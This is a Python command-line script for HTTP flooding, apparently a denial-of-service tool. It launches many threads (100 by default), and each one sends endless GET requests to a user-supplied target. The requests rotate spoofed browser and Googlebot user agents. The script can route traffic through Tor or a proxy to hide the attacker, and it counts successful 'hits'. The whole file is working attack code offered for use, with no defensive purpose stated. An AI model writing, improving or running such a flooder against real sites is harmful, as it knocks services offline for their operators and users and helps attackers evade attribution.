#!/usr/bin/env python
# -*- encoding: UTF-8 -*-

import random
import re
import requests
import threading
import time
from optparse import OptionParser

from arts import Header

config = {}  # Stores de configuration provided by the user
success = 0  # Count of the amount of packets successfully send

user_agents = [
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
]


def parse_address(url):
    url_format = "(http|https)|\://"
    link_format = "^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(/\S*)?$"
    if re.match(url_format + link_format, url):
        return url
    elif re.match(link_format, url):
        return "http://%s" % url
    else:
        print("Url format is incorrect")
        exit(0)


def create_threads(threads):
    for c in range(threads):
        t = threading.Thread(target=work)
        t.start()


def work():
    while True:
        header = {"user-agent": random.choice(user_agents)}
        proxy = config["proxy"] if config["proxy"] else None
        try:
            r = requests.get(config["web"], headers=header, proxies=proxy)
            refresh_status() if r.status_code == 200 else None
        except requests.exceptions.RequestException as e:
            print("Error: {}".format(e))


def parse_proxy(proxy):
    if proxy == "tor":
        return {"socks5": "127.0.0.1:9050"}
    elif re.match("(.*:)?.*@.*|.*:.*", proxy):
        proxy_type = input("Proxy type: ")
        return {proxy_type: proxy}


def check_address(url):
    try:
        req = requests.get(url)
        return req.status_code == requests.codes.ok
    except ConnectionError:
        print("Connection error")
        return False


def refresh_status():
    global success
    success += 1
    print('[>] Number of hits: %d' % success, end="\r")


def check_input():
    global config
    usage = "Usage: %prog -u <Target> [options]"
    parser = OptionParser(usage=usage, version="1")
    parser.add_option("-u", "--url", dest="target", help="IP or domain of the target to scan")
    parser.add_option("-t", "--threads", dest="threads", default=100, help="Set the number of threads")
    parser.add_option("-p", "--proxy", dest="proxy", help="Use a proxy to hide your ass", metavar="<address>:<port>")
    (params, args) = parser.parse_args()
    Header()

    if not params.target:
        parser.print_help()
        exit(0)

    config["web"] = parse_address(params.target)
    config["threads"] = params.threads if params.threads else 100
    config["proxy"] = parse_proxy(params.proxy) if params.proxy else None

    status = check_address(config["web"])
    separator = "#===========================================#"
    print("{0} \n# Target: {1}\n# Threads: {2}\n# Status: {3}\n{0}".format(
        separator,
        config["web"],
        config["threads"],
        "online" if status else "offline"))

    if not status:
        exit(0)


def main():
    global config
    check_input()
    starting_time = time.time()
    create_threads(config["threads"])
    #print("\nRequests made: %d\tTotal time: %d" % (success, time.time() - starting_time))


if __name__ == "__main__":
    main()
